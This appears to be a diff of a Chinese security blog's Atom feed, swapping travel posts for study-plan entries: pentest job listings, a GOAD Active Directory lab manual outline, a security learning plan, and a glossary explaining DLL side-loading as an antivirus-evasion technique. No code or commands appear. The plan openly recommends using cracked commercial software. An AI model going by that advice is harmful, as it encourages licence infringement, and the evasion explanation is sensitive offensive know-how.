@@ -4,19 +4,17 @@
   <title>卷卷</title>
   <subtitle>网络安全知识库</subtitle>
   <icon>https://min168.top/assets/favicon.ico</icon>
-  <updated>2026-10-08T15:24:39.277Z</updated>
+  <updated>2026-10-20T16:11:47.781Z</updated>
   <generator>@vuepress/plugin-feed</generator>
   <link rel="self" href="https://min168.top/atom.xml"/>
   <link rel="alternate" href="https://min168.top/"/>
   <category term="应急响应"/>
   <category term="读书笔记"/>
-  <category term="澳门"/>
   <category term="网络运维"/>
   <category term="渗透测试"/>
   <category term="安全事件"/>
   <category term="供应链安全"/>
   <category term="转载"/>
-  <category term="香港"/>
   <category term="AI对话笔记"/>
   <category term="恶意软件分析"/>
   <category term="计网基础"/>
@@ -31,6 +29,20 @@
   <category term="AI"/>
   <category term="其他"/>
   <category term="面试"/>
+  <entry>
+    <title type="text">思维导图</title>
+    <id>https://min168.top/com/mind/</id>
+    <link href="https://min168.top/com/mind/"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <published>2026-10-20T16:09:46.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">笔记语法</title>
+    <id>https://min168.top/com/grammar/</id>
+    <link href="https://min168.top/com/grammar/"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <published>2026-10-20T16:09:46.000Z</published>
+  </entry>
   <entry>
     <title type="text">终端防御规避技术-2.函数挂钩DLL</title>
     <id>https://min168.top/response/%E7%BB%88%E7%AB%AF%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF-2.%E5%87%BD%E6%95%B0%E6%8C%82%E9%92%A9DLL.html</id>
@@ -228,122 +240,6 @@ Hook（钩子）是在程序执行路径上插入拦截点，改变原有控制�
     <published>2026-08-30T15:44:42.000Z</published>
   </entry>
   <entry>
-    <title type="text">我的影库</title>
-    <id>https://min168.top/com/video/</id>
-    <link href="https://min168.top/com/video/"/>
-    <updated>2026-08-30T15:44:42.000Z</updated>
-    <summary type="html"><![CDATA[<div class="card-container">
-  <a class="image-card" href="./《人生果实》观后感.html">
-    
-    <div class="card-content">
-      <h3 class="card-title">人生果实</h3>
-      <p class="card-desc">纪录片《人生果实》记录九十岁建筑师津端修一与英子夫妇的晚年田园日常，他们亲手种植多样果蔬，精心烹饪每顿餐食，为花木鸟兽倾注关怀，在四季更迭中践行“风吹枯叶落，落叶生肥土”的哲理，用平凡诠释深情，让观者发现质朴生活的丰盈与宁静。</p>
-    </div>
-  </a>
-<a class="image-card" href="./《今日说法》汇总笔记.html">
-    
-    <div class="card-content">
-    <h3 class="card-title">今日说法</h3>
-    <p class="card-desc">央视法制栏目《今日说法》每日聚焦真实案件，以案说法、以法析理，通过专家解读与记者调查，将晦涩法条融入生动故事，既传递法治温度，又警示世人，让观众在短短二十分钟内读懂是非善恶，成为国人最熟悉的“法律公开课”。</p>
-  </div>
-</a>
-</div>]]></summary>
-    <content type="html"><![CDATA[<div class="card-container">
-  <a class="image-card" href="./《人生果实》观后感.html">
-    
-    <div class="card-content">
-      <h3 class="card-title">人生果实</h3>
-      <p class="card-desc">纪录片《人生果实》记录九十岁建筑师津端修一与英子夫妇的晚年田园日常，他们亲手种植多样果蔬，精心烹饪每顿餐食，为花木鸟兽倾注关怀，在四季更迭中践行“风吹枯叶落，落叶生肥土”的哲理，用平凡诠释深情，让观者发现质朴生活的丰盈与宁静。</p>
-    </div>
-  </a>
-<a class="image-card" href="./《今日说法》汇总笔记.html">
-    
-    <div class="card-content">
-    <h3 class="card-title">今日说法</h3>
-    <p class="card-desc">央视法制栏目《今日说法》每日聚焦真实案件，以案说法、以法析理，通过专家解读与记者调查，将晦涩法条融入生动故事，既传递法治温度，又警示世人，让观众在短短二十分钟内读懂是非善恶，成为国人最熟悉的“法律公开课”。</p>
-  </div>
-</a>
-</div>
-]]></content>
-    <published>2026-08-30T15:44:42.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">澳门</title>
-    <id>https://min168.top/com/travel/%E6%BE%B3%E9%97%A8.html</id>
-    <link href="https://min168.top/com/travel/%E6%BE%B3%E9%97%A8.html"/>
-    <updated>2026-08-10T16:18:30.000Z</updated>
-    <summary type="html"><![CDATA[
-<h2>0x01 计划</h2>
-<p>香港回来之后，心里一直惦记着近在咫尺的澳门。翻翻日历，寻了个周末，买了去拱北口岸的车票便出发了。相比香港的繁华，澳门更像一座被时光厚待的小城——四百年前的教堂炮台与彻夜不眠的赌场霓虹并肩而立，历史与现代以一种惊人的密度交叠在一起。</p>
-<h2>0x02 过关</h2>
-<p>从拱北口岸过关，人潮涌动，大多拖家带口冲着大三巴和葡挞而来。出了关闸，便踏上了这块面积不过三十多平方公里的土地。</p>
-<p><code>澳门，古称"濠镜""濠江"，因港阔水深、海面如镜而得名。1553年葡萄牙人借晾晒货物之名登陆，1557年获准定居，澳门自此成为中国最早向西方开放的窗口之一。其名源自妈阁庙——葡萄牙人以闽粤方言"妈阁"音译作"Macau"。1999年12月20日澳门回归祖国，成为继香港之后又一个特别行政区。</code></p>]]></summary>
-    <content type="html"><![CDATA[
-<h2>0x01 计划</h2>
-<p>香港回来之后，心里一直惦记着近在咫尺的澳门。翻翻日历，寻了个周末，买了去拱北口岸的车票便出发了。相比香港的繁华，澳门更像一座被时光厚待的小城——四百年前的教堂炮台与彻夜不眠的赌场霓虹并肩而立，历史与现代以一种惊人的密度交叠在一起。</p>
-<h2>0x02 过关</h2>
-<p>从拱北口岸过关，人潮涌动，大多拖家带口冲着大三巴和葡挞而来。出了关闸，便踏上了这块面积不过三十多平方公里的土地。</p>
-<p><code>澳门，古称"濠镜""濠江"，因港阔水深、海面如镜而得名。1553年葡萄牙人借晾晒货物之名登陆，1557年获准定居，澳门自此成为中国最早向西方开放的窗口之一。其名源自妈阁庙——葡萄牙人以闽粤方言"妈阁"音译作"Macau"。1999年12月20日澳门回归祖国，成为继香港之后又一个特别行政区。</code></p>
-<h2>0x03 大三巴牌坊</h2>
-<p>来澳门必到的自然是地标大三巴牌坊。远远望去，一座巴洛克式石壁立在石阶之巅，庄严而醒目。</p>
-<figure><figcaption>大三巴牌坊</figcaption></figure>
-<p>走近细看，牌坊四层浮雕密布，圣神、耶稣受难、圣母像与诸圣形象交融，中西元素同框，透着四百年前的匠心。石阶上坐满歇脚的游客，拍照的、吃东西的、发呆的，把广场挤得满满当当。</p>
-<p><code>大三巴牌坊是圣保禄学院教堂（Igreja de São Paulo）的前壁遗址。"三巴"即"圣保禄"（São Paulo）的粤语谐音。教堂由耶稣会士始建于1580年前后，主体于1602至1640年间重建，曾是远东最大的天主教大学与教堂。1835年1月26日一场大火烧毁教堂与学院，仅剩这面石制前壁，因形似中国牌坊而得名"大三巴"。2005年，它作为"澳门历史城区"的一部分列入《世界遗产名录》。</code></p>
-<h2>0x04 大炮台公园</h2>
-<p>牌坊旁的小山坡上便是大炮台公园。拾级而上，古木成荫，凉意扑面。</p>
-<figure><figcaption>大炮台公园地图</figcaption></figure>
-<p>山顶视野开阔，澳门半岛尽收眼底——旧城红瓦连绵，远处高楼林立，再远处是氹仔金光闪闪的酒店群。铁炮仍立在墙边，炮口指向海面，仿佛还在守望数百年前的那场海战。</p>
-<p><code>大炮台（Fortaleza do Monte）建于1617至1626年间，由耶稣会士主持修筑，曾是圣保禄学院的防御工事。1622年荷兰舰队进犯澳门，大炮台上的火炮在保卫战中发挥了关键作用，击退了来敌。此后它先后作为军事要塞、总督官邸与气象台使用，如今其内设有澳门博物馆，是读懂澳门的一扇窗。</code></p>
-<h2>0x05 玫瑰圣母堂</h2>
-<p>下了山坡，穿过几条巷子便到议事亭前地。一座明黄色的巴洛克教堂静静立在街角，在阳光下格外明亮——这就是玫瑰圣母堂。</p>
-<figure><figcaption>玫瑰圣母堂</figcaption></figure>
-<p>步入教堂，光线透过彩窗洒在金碧辉煌的祭台上，室内浮雕繁复华丽，与外面的喧闹恍如两个世界。</p>
-<figure><figcaption>玫瑰天主教堂内景</figcaption></figure>
-<p>堂侧还藏着一间圣物宝库，陈列历代的圣像、祭器与法衣，件件都带着岁月的包浆。</p>
-<figure><figcaption>玫瑰圣母堂博物圣物</figcaption></figure>
-<p><code>玫瑰圣母堂（Igreja de São Domingos）约建于1587年，由西班牙圣多明我会传教士修建，是澳门最古老的教堂之一。教堂供奉玫瑰圣母，中文俗称"板樟堂"。它采用巴洛克风格，明黄外墙配白色浮雕，室内保存大量珍贵圣物与艺术品，堂侧的圣物宝库记录了澳门天主教传播的数百年历史。1828年教堂大修，如今外观即定型于此。</code></p>
-<h2>0x06 市政署</h2>
-<p>议事亭前地的葡式碎石路面如波浪般铺展，中央一座喷泉，四周欧式建筑环伺，市政署大楼临街而立，米黄外墙配优雅拱廊。</p>
-<figure><figcaption>市政署</figcaption></figure>
-<p>这里是澳门半岛的政治与商业中心，人流穿梭。广场边的小店飘出牛杂与蛋挞的香气，坐在长椅上看着人来人往，恍惚间仿佛置身某个南欧小城的广场。</p>
-<p><code>议事亭前地是澳门最热闹的中心广场，名称源自明朝在此设立的议事机构。澳门市政署大楼前身是"议事公局"（Leal Senado，意为"忠诚议会"），建于1784年，曾是葡萄牙人自治议事机构的办公场所。如今它延续着市政服务的职能，是澳门历史城区的核心地标，见证了澳门从葡人自治到回归祖国的数百年变迁。</code></p>
-<h2>0x07 永利皇宫</h2>
-<p>过海到了氹仔，先去看了永利皇宫。金色外观在夜色中格外耀眼，正门前一片表演湖，每隔一阵便有一场水舞——喷泉随乐起舞，水柱最高可冲数十米，灯光、水雾与乐声交织，围观人群不时发出惊叹。</p>
-<figure><figcaption>永利皇宫喷泉</figcaption></figure>
-<p>一国游客走了过来，连比带划地请我帮他们一家人拍张合影。我一下就慌了，半句语言讲不清楚。话到嘴边又咽了回去。最后只能红着脸点头，接过相机，手忙脚乱地帮他们按了几下快门。拍完他们连声道谢，我除了点头傻笑，一个完整的句子也说不出来。那一刻心里特别懊恼：怎么就没学好英语呢？</p>
-<p>步入大厅更是极尽奢华，金色与花卉元素铺满视野，巨大的艺术装置悬于穹顶之下，恍若宫殿。</p>
-<figure><figcaption>永利皇宫内景</figcaption></figure>
-<p><code>永利皇宫（Wynn Palace）2016年开业，是永利澳门集团在路氹的旗舰度假村，创始人是美国博彩业大亨史提芬·永利。酒店以"花"与"金"为设计主题，门前的表演湖设有大型音乐喷泉，游客还可乘观光缆车穿越湖面，是金光大道上最具代表性的奢华地标之一。</code></p>
-<h2>0x08 官也街</h2>
-<p>从永利皇宫出来，肚子也饿了，便拐去官也街。这是一条窄窄的小巷，却汇集了澳门最有名的味道——猪扒包、水蟹粥、杏仁饼、葡挞，整条街飘着饼香与肉香。</p>
-<figure><figcaption>官也街</figcaption></figure>
-<p>排了一会儿队，买到热腾腾的羊杂，站在街边便迫不及待地尝起来。</p>
-<p>一个外国男子走了过来，问chinese？我掏出手机，打开翻译软件。一来一回，交流了好久，他们是问路的。</p>
-<p><code>官也街（Rua do Cunha）位于氹仔老城，是澳门最负盛名的小吃街，以一位葡萄牙海军上校的名字命名。街道两侧葡式建筑保存完好，遍布传统饼家与美食店，是感受澳门市井烟火气的最佳去处。氹仔本为独立离岛，随路氹填海与金光大道开发，如今已与澳门半岛、路环连成一片。</code></p>
-<h2>0x09 威尼斯人</h2>
-<p>吃饱喝足，去见识路氹最负盛名的地标——威尼斯人度假村。走进大堂，头顶是绘满蓝天白云的天幕，脚下是运河与石桥，贡多拉船夫唱着意大利民歌缓缓划过，人造的天空永远明亮。</p>
-<figure><figcaption>威尼斯人</figcaption></figure>
-<p>商场内穹顶壁画、威尼斯式楼宇与运河交错，营造出"永不下雨的水城"。游客纷纷登上贡多拉，在歌声与涟漪里留影。</p>
-<p>我正站在桥边拍照，一位陌生的外国女士走了过来，微笑着递过手机，指了指手机，又指了指镜头——又是请帮忙拍照。这一次我明显熟练了些，先是认真地帮她找角度、倒数"，拍完还翻给她看效果。她道谢时，我鼓起勇气问了一句："Where are you from?" 她笑着答："India, I'm a police."</p>
-<p>虽然全程还是靠手势和单词拼凑，但从永利皇宫的慌乱，到官也街靠翻译软件，再到这次能主动问出第一句完整的话——这一趟下来，我第一次真切地感受到，以前学的英语好像真的派上用场了。</p>
-<p><code>威尼斯人度假村2007年开业，由美国拉斯维加斯金沙集团投资兴建，灵感源自威尼斯水城风情。它把运河、贡多拉、圣马可广场搬进室内，仿照拉斯维加斯威尼斯人酒店打造，是路氹"金光大道"上规模最大的综合度假村之一，也带动了澳门以博彩为核心的综合旅游模式。</code></p>
-<h2>0x0A 新葡京与葡京</h2>
-<p>夜色渐深，回到澳门半岛，远远便望见新葡京那朵金光闪闪的"莲花"——整栋楼如一枚倒置的宝石，在夜空中夺目。紧挨着它的，是已有半个世纪历史的葡京赌场，鸟笼般圆润的造型带着上世纪七十年代的复古气息。</p>
-<figure><figcaption>新葡京</figcaption></figure>
-<p>两代赌场并立，仿佛一部浓缩的澳门博彩史。我没有进去，只在外面看了看——灯火通明的门口，进进出出的人流络绎不绝，那是澳门独有的烟火气。</p>
-<figure><figcaption>葡京娱乐场</figcaption></figure>
-<p><code>澳门博彩业源远流长：1847年澳葡政府首开博彩合法化先例；1961年，何鸿燊与叶汉合办的澳门旅游娱乐公司夺得博彩专营权，葡京赌场1970年开业，其鸟笼造型暗含"进得来出不去"的设计巧思，开启澳门博彩业近半个世纪的垄断时代。2002年澳门博彩牌照开放，引入金沙、永利等国际集团，博彩业爆发式增长，澳门一跃成为全球博彩收入最高的城市。2008年开业的新葡京，正是澳博在专营与开放交替之际的旗舰之作。</code></p>
-<h2>0x0B 尾声</h2>
-<p>回程站在码头边，最后看了一眼澳门的夜色。威尼斯人那片灯光连成金红色的海，映在水面上，随波轻轻晃动。</p>
-<figure><figcaption>威尼斯夜景</figcaption></figure>
-<p>这座城市小得一天就能逛完，却又厚得装下四百多年的风云变幻——教堂与赌场比邻，历史与欲望共生，旧城的钟声与新城的霓虹在同一个夜空下交叠。小时候从历史课本读到"1557年葡萄牙人定居澳门""1999年澳门回归"，如今亲身站在这里，才真切感到什么叫"历史照进现实"。</p>
-<p>其实这一趟最让我意外的收获，是那三次磕磕绊绊的英语对话。老实说，我英语考过30分，平时从不敢开口，可澳门之行里，从永利皇宫的手足无措，到官也街靠翻译软件问路，再到威尼斯人主动问出那句"Where are you from"——三幕下来，我第一次觉得那些年背的单词、做的卷子，真真切切地在生活里派上了用场。哪怕只会比划和蹦单词，开口的那一刻，世界就悄悄向我打开了一道门。</p>
-<p>回到口岸过关，排队的人依然很多，但心里是满足的。澳门这趟，值了。</p>
-]]></content>
-    <category term="澳门"/>
-    <published>2026-08-10T16:18:30.000Z</published>
-  </entry>
-  <entry>
     <title type="text">OPNsense 部署与三网卡区域隔离</title>
     <id>https://min168.top/net/OPNsense%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%B8%89%E7%BD%91%E5%8D%A1%E5%8C%BA%E5%9F%9F%E9%9A%94%E7%A6%BB.html</id>
     <link href="https://min168.top/net/OPNsense%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%B8%89%E7%BD%91%E5%8D%A1%E5%8C%BA%E5%9F%9F%E9%9A%94%E7%A6%BB.html"/>
@@ -425,6 +321,191 @@ Hook（钩子）是在程序执行路径上插入拦截点，改变原有控制�
 ]]></content>
     <category term="网络运维"/>
     <published>2026-08-02T10:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">BOSS直聘 - 渗透测试 &amp; 红队岗位 JD 汇总</title>
+    <id>https://min168.top/plans/BOSS%E5%B2%97%E4%BD%8DJD.html</id>
+    <link href="https://min168.top/plans/BOSS%E5%B2%97%E4%BD%8DJD.html"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <summary type="html"><![CDATA[
+<blockquote>
+<p>抓取时间: 2026-07-06 | 地区: 深圳 + 昆明</p>
+</blockquote>
+<hr>
+<h2>一、渗透测试岗位</h2>
+<h3>1. 安服渗透工程师</h3>
+<ul>
+<li>
+<p><strong>公司</strong>: 群立信息</p>
+</li>
+<li>
+<p><strong>地点</strong>: 深圳·龙岗区·坂田</p>
+</li>
+<li>
+<p><strong>薪资</strong>: 9-12K</p>
+</li>
+<li>
+<p><strong>经验</strong>: 1-3年</p>
+</li>
+<li>
+<p><strong>学历</strong>: 本科</p>
+</li>
+<li>
+<p><strong>JD</strong>:<br>
+岗位职责：</p>
+<ol>
+<li>独立完成渗透服务、漏扫服务、基线核查服务、应急响应服务、溯源分析服务、重保支持与护网支持服务</li>
+<li>安服所需安全设备硬件或软件等设备独立完成实施部署</li>
+<li>与客户安全运维人员建立长期联系关系</li>
+</ol>
+<p>任职要求：</p>
+<ol>
+<li>参与客户攻防演练重保活动</li>
+<li>熟练使用Nmap、SQLMap、Burpsuite、Metasploit等</li>
+<li>熟练掌握OWASP Top10漏洞类别</li>
+<li>对各类操作系统、应用系统的漏洞有较深理解</li>
+<li>了解防火墙、WAF、IPS、态势感知、EDR等</li>
+<li>掌握常见脚本语言，WEB渗透测试能力</li>
+<li>掌握应急响应流程</li>
+<li>计算机相关专业本科以上学历</li>
+</ol>
+</li>
+</ul>]]></summary>
+    <content type="html"><![CDATA[
+<blockquote>
+<p>抓取时间: 2026-07-06 | 地区: 深圳 + 昆明</p>
+</blockquote>
+]]></content>
+    <published>2026-08-08T13:36:27.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">GOAD 靶场环境使用手册</title>
+    <id>https://min168.top/plans/GOAD_%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.html</id>
+    <link href="https://min168.top/plans/GOAD_%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.html"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <summary type="html"><![CDATA[
+<blockquote>
+<p><strong>Game of Active Directory</strong> — 由 Orange Cyber Defense 开发的 Active Directory 渗透测试实验环境</p>
+<p>文档版本: 2026-08-02 | 部署方式: VMware Workstation Pro + Vagrant</p>
+</blockquote>
+<hr>
+<h2>目录</h2>
+<ol>
+<li><a href="#1-%E7%8E%AF%E5%A2%83%E6%A6%82%E8%A7%88">环境概览</a></li>
+<li><a href="#2-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B8%85%E5%8D%95">虚拟机清单</a></li>
+<li><a href="#3-%E5%9F%9F%E7%BB%93%E6%9E%84%E4%B8%8E%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB">域结构与信任关系</a></li>
+<li><a href="#4-%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E8%AF%A6%E6%83%85">服务部署详情</a></li>
+<li><a href="#5-%E5%85%B3%E9%94%AE%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E4%B8%8E%E5%87%AD%E6%8D%AE">关键用户账户与凭据</a></li>
+<li><a href="#6-%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF">攻击路径与漏洞场景</a></li>
+<li><a href="#7-adcs-%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E">ADCS 证书服务漏洞</a></li>
+<li><a href="#8-mssql-%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%94%BB%E5%87%BB%E9%93%BE">MSSQL 配置与攻击链</a></li>
+<li><a href="#9-%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97">日常使用指南</a></li>
+<li><a href="#10-%E7%BD%91%E7%BB%9C%E4%B8%8E%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F">网络与连接方式</a></li>
+<li><a href="#11-%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5">故障排查</a></li>
+<li><a href="#12-%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90">参考资源</a></li>
+</ol>]]></summary>
+    <content type="html"><![CDATA[
+<blockquote>
+<p><strong>Game of Active Directory</strong> — 由 Orange Cyber Defense 开发的 Active Directory 渗透测试实验环境</p>
+<p>文档版本: 2026-08-02 | 部署方式: VMware Workstation Pro + Vagrant</p>
+</blockquote>
+]]></content>
+    <published>2026-08-08T13:36:27.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">学习计划暂存区</title>
+    <id>https://min168.top/plans/</id>
+    <link href="https://min168.top/plans/"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <summary type="html"><![CDATA[
+<p>本文件夹存放<strong>学习计划</strong>和<strong>未完成的学习步骤文档</strong>。</p>
+<h2>流程</h2>
+<ol>
+<li>制定计划时，由 skill 在本目录生成 <code>&lt;主题&gt;.md</code> 学习计划（操作说明书式）</li>
+<li>开始动手学习时，把文档移动到 <code>src/&lt;对应分类&gt;/</code>（分类规则见 skill 的 <code>references/blog-conventions.md</code>）</li>
+<li>学习过程中按文档补全截图、踩坑记录，最后补充面试知识点总结</li>
+</ol>]]></summary>
+    <content type="html"><![CDATA[
+<p>本文件夹存放<strong>学习计划</strong>和<strong>未完成的学习步骤文档</strong>。</p>
+<h2>流程</h2>
+<ol>
+<li>制定计划时，由 skill 在本目录生成 <code>&lt;主题&gt;.md</code> 学习计划（操作说明书式）</li>
+<li>开始动手学习时，把文档移动到 <code>src/&lt;对应分类&gt;/</code>（分类规则见 skill 的 <code>references/blog-conventions.md</code>）</li>
+<li>学习过程中按文档补全截图、踩坑记录，最后补充面试知识点总结</li>
+</ol>
+<h2>说明</h2>
+<ul>
+<li>本目录不属于 <code>src/</code>，不会被 VuePress 构建，仅作内部暂存</li>
+<li>移动文档时注意同步调整图片引用路径（改为 <code>assets/</code> 相对路径）与 frontmatter 的 date/order</li>
+</ul>
+]]></content>
+    <published>2026-08-08T13:36:27.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">安全产品体系学习计划（攻防一体版）</title>
+    <id>https://min168.top/plans/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E4%BD%93%E7%B3%BB%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92.html</id>
+    <link href="https://min168.top/plans/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E4%BD%93%E7%B3%BB%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92.html"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <summary type="html"><![CDATA[
+<blockquote>
+<p>目标：作为网络安全从业者（<strong>安服工程师方向，攻防兼顾</strong>），通过"开源还原商业产品 + 渗透测试实战 + 攻防结合"，把主流安全产品<strong>每个核心功能</strong>和<strong>对应攻击技术</strong>都弄明白并实操。防御线补齐产品经验，攻击线把"会用工具"补成<strong>体系化方法论</strong>，达到"没用过商业设备也能展示等同使用经验"的成熟度，求职时攻防两端都有可展示项目。</p>
+<p>结合昆明本地岗位画像（驻场安服 / 电力行业 / 应急响应 / 等保合规 / 蓝队值守为高频方向）与 <strong>GOAD 域控靶场</strong>，把"机器靶场 / 安全产品 / 攻防演练"串联成一条互相利用的链路：<strong>攻击打 GOAD 与靶站，检测看自家搭建的产品栈，日志回填规则</strong>。</p>
+<p>纯 md 计划文件。文章标题 = 「工具/产品-实验内容」，标注 <strong>★</strong> 的为<strong>攻防结合篇</strong>（用攻击验证自家搭建的产品与规则）。</p>
+<p><strong>v2 改版说明</strong>（按资深安服视角精简）：原 58 必做篇偏"SOC 工程师 + 红队"，与安服/驻场目标不匹配。现精简为 <strong>34 必做</strong>——砍掉/降级 Security Onion 全栈、Kibana 大屏、Shuffle SOAR、OpenRASP 深度、ADCS 深度、Viper/Empire、AI 渗透双篇、Squid、Caldera 等，把省下的时间投入：<strong>Python 脚本线（多家 JD 明确要求）、应急响应多场景（Web/勒索挖矿/钓鱼 3 篇）、等保 2.0 实操（从"了解"升为"必做"）</strong>。</p>
+</blockquote>]]></summary>
+    <content type="html"><![CDATA[
+<blockquote>
+<p>目标：作为网络安全从业者（<strong>安服工程师方向，攻防兼顾</strong>），通过"开源还原商业产品 + 渗透测试实战 + 攻防结合"，把主流安全产品<strong>每个核心功能</strong>和<strong>对应攻击技术</strong>都弄明白并实操。防御线补齐产品经验，攻击线把"会用工具"补成<strong>体系化方法论</strong>，达到"没用过商业设备也能展示等同使用经验"的成熟度，求职时攻防两端都有可展示项目。</p>
+<p>结合昆明本地岗位画像（驻场安服 / 电力行业 / 应急响应 / 等保合规 / 蓝队值守为高频方向）与 <strong>GOAD 域控靶场</strong>，把"机器靶场 / 安全产品 / 攻防演练"串联成一条互相利用的链路：<strong>攻击打 GOAD 与靶站，检测看自家搭建的产品栈，日志回填规则</strong>。</p>
+<p>纯 md 计划文件。文章标题 = 「工具/产品-实验内容」，标注 <strong>★</strong> 的为<strong>攻防结合篇</strong>（用攻击验证自家搭建的产品与规则）。</p>
+<p><strong>v2 改版说明</strong>（按资深安服视角精简）：原 58 必做篇偏"SOC 工程师 + 红队"，与安服/驻场目标不匹配。现精简为 <strong>34 必做</strong>——砍掉/降级 Security Onion 全栈、Kibana 大屏、Shuffle SOAR、OpenRASP 深度、ADCS 深度、Viper/Empire、AI 渗透双篇、Squid、Caldera 等，把省下的时间投入：<strong>Python 脚本线（多家 JD 明确要求）、应急响应多场景（Web/勒索挖矿/钓鱼 3 篇）、等保 2.0 实操（从"了解"升为"必做"）</strong>。</p>
+</blockquote>
+<h2>通用学习方法</h2>
+<ul>
+<li><strong>双线并行、攻防互为验证</strong>：防御线（安全产品）+ 攻击线（渗透测试）同步推进，用攻击检验自己搭的产品，用产品检测自己的攻击</li>
+<li><strong>功能映射</strong>：每个商业产品 → 用顶尖开源/免费方案 1:1 还原核心功能来学</li>
+<li><strong>一次搭建，层层叠加</strong>：同一套实验网络按阶段叠加，前阶段设备的日志被后阶段使用</li>
+<li><strong>产品学习一律从部署开始</strong>：每款产品/工具的第一篇就是<strong>部署篇</strong>——环境准备 → 安装/镜像拉取 → 依赖与基础配置 → 验证服务真正跑起来（页面/端口/日志可见），部署不通过不进入下一步；之后的篇目才是功能配置、规则调优与攻防验证。每篇的操作说明书里，"部署"都是第一步标题</li>
+<li><strong>Python 贯穿始终</strong>：渗透脚本、日志解析、POC 编写、应急脚本统一用 Python 完成（不另起语言），脚本积累进个人工具库，求职时可展示</li>
+<li><strong>GOAD 专职内网靶场</strong>：GOAD（3域2林5台域机）只当"被打的一方"，被测产品当"看的一方"——攻击链打在 GOAD 上，自家 SIEM/EDR/Suricata 去检测，一次演练同时练红蓝双方</li>
+<li><strong>每功能一验证</strong>：每个核心功能都要动手配一遍 + 截图 + 记录踩坑</li>
+<li><strong>文档即项目</strong>：每篇文章就是一个项目，写博客沉淀，简历可直接引用</li>
+</ul>
+<h2>分层与实验策略</h2>
+<ul>
+<li><strong>必做</strong>：开源成熟 + 面试高频（含昆明岗位高频的<strong>基线核查、应急响应、内网/域渗透、等保合规</strong>），按"前置渗透基础 → 边界 → 资产 → 检测 → 管理闭环 → 内网纵深"逻辑推进；<strong>Python 线 + 应急响应多场景 + 等保 2.0 实操为 v2 新增重点</strong></li>
+<li><strong>选做</strong>：开源可用但频率或依赖度略低，学完必做后按需深入</li>
+<li><strong>了解为主</strong>：以商业产品为主、无成熟开源方案 → 原则上不做实验，只通过文档/演示/试用理解</li>
+<li><strong>商业产品实验策略</strong>：除非网上有破解/学习版（仅限个人学习环境），否则不做商业实验；<strong>有破解/学习版就优先用破解版实操</strong>。Cobalt Strike 收费，优先用开源 <strong>Sliver</strong> 学习，有 CS 学习版再做对照</li>
+</ul>
+<h2>实验环境</h2>
+<p>同一套基础实验网络，所有产品都在这上面叠加：</p>
+<p>| 虚拟机角色 | 推荐系统 | 配置建议 | 网络模式 | 核心用途 |<br>
+|</p>
+]]></content>
+    <published>2026-08-08T13:36:27.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">攻防演练关键技术学习笔记</title>
+    <id>https://min168.top/plans/%E5%B7%A5%E4%BD%9C%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E6%9C%AF%E8%AF%AD.html</id>
+    <link href="https://min168.top/plans/%E5%B7%A5%E4%BD%9C%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E6%9C%AF%E8%AF%AD.html"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <summary type="html"><![CDATA[
+<blockquote>
+<p>攻防演练项目中涉及的专业术语整理</p>
+</blockquote>
+<hr>
+<h2>1. 白加黑（DLL Side-Loading）</h2>
+<h3>是什么</h3>
+<p>"白"指的是有合法数字签名的可信程序（如微软、英伟达、Adobe等官方签名的EXE），"黑"指的是恶意DLL文件。白加黑利用Windows的DLL加载顺序机制——当白程序运行时，会在特定目录查找所需的DLL，如果攻击者将恶意DLL放到这些目录下且命名匹配，白程序就会"乖乖地"加载恶意DLL。</p>
+<h3>为什么能绕过杀软</h3>
+<p>安全软件通常对合法签名的白程序信任度高，不会拦截它的行为。恶意代码躲在白程序内部执行，杀软难以检测。</p>]]></summary>
+    <content type="html"><![CDATA[
+<blockquote>
+<p>攻防演练项目中涉及的专业术语整理</p>
+</blockquote>
+]]></content>
+    <published>2026-08-08T13:36:27.000Z</published>
   </entry>
   <entry>
     <title type="text">CobaltStrike部署与C2功能实战指南</title>
@@ -785,62 +866,6 @@ Hook（钩子）是在程序执行路径上插入拦截点，改变原有控制�
 ]]></content>
     <category term="读书笔记"/>
     <published>2026-05-18T15:41:40.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">香港</title>
-    <id>https://min168.top/com/travel/%E9%A6%99%E6%B8%AF.html</id>
-    <link href="https://min168.top/com/travel/%E9%A6%99%E6%B8%AF.html"/>
-    <updated>2026-08-10T16:18:30.000Z</updated>
-    <summary type="html"><![CDATA[
-<h2>0x01 计划</h2>
